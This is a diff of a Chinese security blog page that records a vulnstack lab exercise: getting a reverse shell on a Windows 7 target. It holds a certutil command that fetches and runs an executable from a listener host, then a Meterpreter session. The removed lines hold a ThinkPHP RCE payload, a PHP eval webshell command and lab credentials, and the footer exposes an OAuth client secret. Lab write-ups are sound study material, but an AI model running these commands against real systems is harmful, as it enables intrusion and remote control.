@@ -5,7 +5,7 @@
     <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
     <title>
         
-            Hexo
+            vulnstack靶场学习记录-反弹shell2
         
     </title>
     <link rel="icon" href="/img/favicon.png"/>
@@ -98,15 +98,13 @@
     </nav>
 </header>
     <main class="main">
-        <section class="posts">
-    
         <article class="post">
             <h1>
                 <a class="title" href="/2020/04/01/vulnstack%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E5%8F%8D%E5%BC%B9shell2/"> 
                     vulnstack靶场学习记录-反弹shell2 
                 </a>
             </h1>
-                        <div class="meta">
+            <div class="meta">
                 <a class="date"> 
                     <i class="fa fa-calendar" aria-hidden="true"></i>                    
                     2020-04-01   
@@ -116,8 +114,10 @@
                 
                     
             </div>
+<div class="toc">
+  <ol class="toc-list"><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#信息"><span class="toc-list-text">信息</span></a></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#生成shell"><span class="toc-list-text">生成shell</span></a></li></ol>
+</div>
             <div class="content">
-                
                 <p><strong>本机生成shell了。开启http服务，监听。靶机下载shell并执行。</strong></p>
 <h1 id="信息"><a href="#信息" class="headerlink" title="信息"></a>信息</h1><p>win7: 172.16.10.136<br>mac：172.16.10.1</p>
 <h1 id="生成shell"><a href="#生成shell" class="headerlink" title="生成shell"></a>生成shell</h1><ol>
@@ -132,106 +132,91 @@ certutil.exe -urlcache -split -f http://10.0.3.120/jet.exe &amp;jet.exe &amp;del
 <li>“sessions 1”进入meterpreter命令界面<br><img src="https://i.loli.net/2020/04/01/5pzQrF8fGH6YdEL.jpg" alt=""></li>
 </ol>
 
-                
             </div>
-            <div class="continue">
-            <a href="/2020/04/01/vulnstack%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E5%8F%8D%E5%BC%B9shell2/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
-            </a>
+          
+           
+            <div class="copyright">
+                <div class="name">
+                    <a>Author:</a>
+                    <a>Sōsuke</a>
+                </div>
+                <div class="link">
+                    <a>Link:</a>
+                    <a class="permalink" href="http://yoursite.com/2020/04/01/vulnstack%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E5%8F%8D%E5%BC%B9shell2/">http://yoursite.com/2020/04/01/vulnstack%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E5%8F%8D%E5%BC%B9shell2/</a>
+                </div>
+                <div class="license">
+                    <a>Statement:</a>
+                    <a>All articles in this blog shall be licensed by CC BY-NC-SA 3.0 CN, unless otherwise stated. Please indicate the provenance!</a>
+                </div>
             </div>
-        </article>
-        
-        <article class="post">
-            <h1>
-                <a class="title" href="/2020/04/01/vulnstack%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E5%8F%8D%E5%BC%B9shell1/"> 
-                    vulnstack靶场学习记录-反弹shell1 
-                </a>
-            </h1>
-                        <div class="meta">
-                <a class="date"> 
-                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
-                    2020-04-01   
-                </a>
-                
-                
-                
-                    
-            </div>
-            <div class="content">
-                
-                <h1 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h1><ol>
-<li>双网卡win7 模拟内外网<ol>
-<li>内网 192.168.138.136</li>
-<li>外网 172.16.10.128</li>
-</ol>
-<ul>
-<li>普通用户heart/2020</li>
-<li>域管理 Administrator/dc123.com</li>
-</ul>
-</li>
-<li>win2008 <ol>
-<li>192.168.138.138</li>
-</ol>
-</li>
-</ol>
-<h1 id="其他信息"><a href="#其他信息" class="headerlink" title="其他信息"></a>其他信息</h1><p>本机ip（vmnet8）  1. 172.16.10.1<br>本机与win7网卡b模拟外网环境；win2008和win7网卡a模拟内网环境</p>
-<h1 id="靶机准备"><a href="#靶机准备" class="headerlink" title="靶机准备"></a>靶机准备</h1><ul>
-<li>win7靶机以非域管理员身份打开  C:\phpstudy\phpstudy.exe</li>
-</ul>
-<h1 id="靶机端口扫描"><a href="#靶机端口扫描" class="headerlink" title="靶机端口扫描"></a>靶机端口扫描</h1><p><img src="https://i.loli.net/2020/04/01/XQPHr7B9kL5RZKe.jpg" alt=""></p>
-<ol>
-<li>172.16.10.128 80/3306端口</li>
-</ol>
-<h1 id="访问80端口"><a href="#访问80端口" class="headerlink" title="访问80端口"></a>访问80端口</h1><ol>
-<li>thinkphp架构<br><img src="https://i.loli.net/2020/04/01/yZrgKXncB6D8vtu.jpg" alt=""></li>
-<li>访问错误页面，得到版本型号<br><img src="https://i.loli.net/2020/04/01/Oi2p4bDMNknAozJ.jpg" alt=""></li>
-</ol>
-<h1 id="thinkphp-rce利用"><a href="#thinkphp-rce利用" class="headerlink" title="thinkphp rce利用"></a>thinkphp rce利用</h1><ol>
-<li><p><code>searchsploit thinkphp</code></p>
-</li>
-<li><p>找到对应版本 5.X, -m参数导出到本地<br><code>searchsploit -m exploits/php/webapps/46150.txt</code></p>
-</li>
-<li><p>读取载荷信息<br><code>cat 46150.txt</code><br><img src="https://i.loli.net/2020/04/01/wif2Y3ZaEWR7srB.jpg" alt=""></p>
-</li>
-<li><p>找到对应版本，用的第三个payload，修改最后的参数值</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;url&#x2F;to&#x2F;thinkphp_5.0.22&#x2F;?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2020/04/01/SMHgjGFepZIDsR2.jpg" alt=""></p>
-<ul>
-<li><p>成功执行了系统命令–此时只是调用系统函数执行的系统命令，我们需要得到可交互式的shell</p>
-</li>
-<li><p>采用的方式是先在web端写入webshell源码，用蚁剑连接之后，用蚁剑上传冰蝎的phpshell，冰蝎连接。</p>
-</li>
-</ul>
-</li>
-</ol>
-<h1 id="传马得shell"><a href="#传马得shell" class="headerlink" title="传马得shell"></a>传马得shell</h1><ol>
-<li>写入wehshell源码<br><code>echo ^&lt;?php eval($_POST[&#39;a&#39;]);?^&gt; &gt; 5.php</code> (cmd 转义字符 ^)<ul>
-<li>文件有了</li>
-</ul>
-</li>
-</ol>
-<p><img src="https://i.loli.net/2020/04/01/bSmqGo8e3cNZxsp.jpg" alt=""></p>
-<ul>
-<li>源码无误</li>
-</ul>
-<p><img src="https://i.loli.net/2020/04/01/aGxHimbByILvU43.jpg" alt=""><br>2. 连蚁剑<br><img src="https://i.loli.net/2020/04/01/jAzH1c3VXkK6Crs.jpg" alt=""><br>3. 上传文件–冰蝎的webshell<br>4. 冰蝎连 <code>http://172.16.10.128/shell.php</code><br>    1. <img src="https://i.loli.net/2020/04/01/Ya7JK2RveNiuIw6.jpg" alt=""><br>    2. <img src="https://i.loli.net/2020/04/01/38Q4alLj5FJyhiq.jpg" alt=""></p>
-<h1 id="反弹msfshell"><a href="#反弹msfshell" class="headerlink" title="反弹msfshell"></a>反弹msfshell</h1><ol>
-<li>根据上面的提示<br> <img src="https://i.loli.net/2020/04/01/sPLfaMB6KDmjSlA.jpg" alt=""></li>
-<li>反弹msfshell</li>
-</ol>
-<p><img src="https://i.loli.net/2020/04/01/zKWy7xC9Sdih6mo.jpg" alt=""></p>
+            
 
-                
-            </div>
-            <div class="continue">
-            <a href="/2020/04/01/vulnstack%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E5%8F%8D%E5%BC%B9shell1/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
-            </a>
-            </div>
-        </article>
-        
-</section>
+          
 
+
+</article>
+
+
+<div class="tip">
+<button class="tip-btn">
+    Tip
+</button>
+<div class="tip-img">
+<ul>
+    
+<li>
+    <img src="/img/qrcode.jpeg"></img>
+</li>
+
+ 
+<li>
+    <img src="/img/qrcode.jpeg"></img>
+</li>
+
+</ul>
+</div>
+</div>
+
+<div class="more">
+
+<div></div>
+
+    <div class="next">
+    <a href="/2020/04/01/vulnstack%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E5%8F%8D%E5%BC%B9shell1/"> vulnstack靶场学习记录-反弹shell1 </a>
+    </div>
+    
+</div>
+
+<div class="bdsharebuttonbox">
+<a href="#" class="bds_weixin fa fa-weixin" data-cmd="weixin" title="分享到微信" style="color:#1cbd8f">
+</a>
+<a href="#" class="bds_tsina fa fa-weibo" data-cmd="tsina" title="分享到新浪微博" style="color:#ff6363">
+</a>
+<a href="#" class="bds_twi fa fa-twitter" data-cmd="twi" title="分享到Twitter" style="color:#00A7EB">
+</a>
+<a href="#" class="bds_fbook fa fa-facebook" data-cmd="fbook" title="分享到Facebook" style="color:#00A7EB">
+</a>
+</div>
+<script>
+window._bd_share_config={
+    "common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"1","bdSize":"16"},
+    "share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='../../../../../static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+ 
+<div id="comments"></div>
+
+<script>
+    var gitment = new Gitment({
+    id: "Wed Apr 01 2020 18:22:06 GMT+0800",
+    owner: "Vevlins",
+    repo: "Vevlins.github.io",
+    oauth: {
+      client_id:"8d83609a651e972e308d",
+      client_secret: "37e40c89a47e957f654e86f71c5caaccad0774de",
+    }
+  })
+  gitment.render('comments')
+</script>
     </main>
     <a class="not-found">not found!</a>
     <div class="search-items">
